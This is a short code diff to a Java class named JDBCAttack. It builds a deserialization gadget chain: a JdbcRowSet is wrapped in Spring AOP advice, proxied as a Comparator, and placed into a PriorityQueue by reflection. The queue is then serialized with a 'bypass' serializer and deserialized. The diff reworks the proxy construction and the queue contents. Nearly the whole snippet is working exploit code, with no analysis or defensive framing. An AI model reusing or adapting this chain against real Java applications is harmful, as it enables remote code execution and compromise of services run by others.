@@ -16,14 +16,15 @@ public class JDBCAttack {
         Method method=jdbcRowSet.getClass().getMethod("getDatabaseMetaData");
         SingletonAspectInstanceFactory factory = new SingletonAspectInstanceFactory(jdbcRowSet);
         AspectJAroundAdvice advice = new AspectJAroundAdvice(method,new AspectJExpressionPointcut(),factory);
-        Proxy proxy1 = (Proxy) ProxyUtil.getAProxy(advice,Advice.class);
-        Proxy finalproxy=(Proxy) ProxyUtil.getBProxy(proxy1,new Class[]{Comparator.class});
+//        Proxy proxy1 = (Proxy) ProxyUtil.getAProxy(advice,Advice.class);
+//        Proxy finalproxy=(Proxy) ProxyUtil.getBProxy(proxy1,new Class[]{Comparator.class});
+        Proxy finalproxy = (Proxy) ProxyUtil.getCProxy(advice, new Class[]{Comparator.class});
         PriorityQueue PQ=new PriorityQueue(1);
         PQ.add(1);
         PQ.add(2);
 
         ReflectUtil.setFieldValue(PQ,"comparator",finalproxy);
-        ReflectUtil.setFieldValue(PQ,"queue",new Object[]{proxy1,proxy1});
+        ReflectUtil.setFieldValue(PQ,"queue",new Object[]{1,1});
         byte[] bytes = SerializeUtil.serializeBypass(PQ);
         SerializeUtil.deserialize(bytes);
     }
